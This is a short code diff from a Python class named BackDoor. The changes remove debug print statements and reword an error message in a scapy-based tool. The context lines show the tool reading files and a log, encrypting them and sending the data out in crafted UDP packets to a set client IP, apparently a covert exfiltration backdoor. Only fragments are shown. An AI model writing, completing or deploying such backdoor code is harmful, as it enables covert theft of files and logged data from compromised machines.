@@ -307,7 +307,6 @@ class BackDoor:
         payload = terminator
         packet = ip / udp / payload
         packets.append(packet)
-        print(packets)
         self.send_pkt(packets)
 
     def get_scapy_layers(self, port: str) -> tuple[IP, UDP]:
@@ -334,7 +333,6 @@ class BackDoor:
             data = f.read()
             cipher = self.generate_cipher()
             encrypted_data = self.encrypt_file(cipher, data)
-            print(encrypted_data)
             binary_data = self.get_bin(encrypted_data)
 
 
@@ -460,7 +458,7 @@ class BackDoor:
             self.prepare_data(file)
             self.prepare_data(self.log)
         else:
-            print("Not exist, my man")
+            print("Does not exist")
 
     def set_client(self, ip):
         print(f"Setting client ip as {ip}")
